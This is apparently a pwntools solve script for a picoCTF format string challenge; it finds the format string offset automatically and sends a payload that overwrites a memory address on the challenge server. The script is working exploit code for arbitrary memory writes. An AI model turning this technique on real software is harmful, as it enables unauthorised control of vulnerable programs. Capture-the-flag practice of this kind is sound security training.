from pwn import *

local = False
host = 'rhea.picoctf.net'
port = 63458
program = './vuln'
context.binary = ELF('./vuln')

if local:
    io = process('./vuln')
else: 
    io = remote(host, port)

def exec_fmt(payload):
    if local:
        io = process('./vuln')
    else: 
        io = remote(host, port)
    io.sendline(payload)
    return io.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
print(payload)

io.recv()
io.sendline(payload)
print(io.recvall())
